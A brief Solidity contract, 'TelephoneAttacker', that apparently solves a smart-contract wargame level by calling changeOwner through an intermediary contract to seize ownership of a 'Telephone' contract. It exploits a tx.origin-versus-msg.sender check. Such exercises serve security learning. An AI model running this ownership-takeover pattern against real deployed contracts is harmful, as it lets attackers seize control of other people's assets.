// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttacker {
    ITelephone telephone;

    constructor(address _address) {
        telephone = ITelephone(_address);
    }

    function attack() public {
        telephone.changeOwner(msg.sender);
    }
}
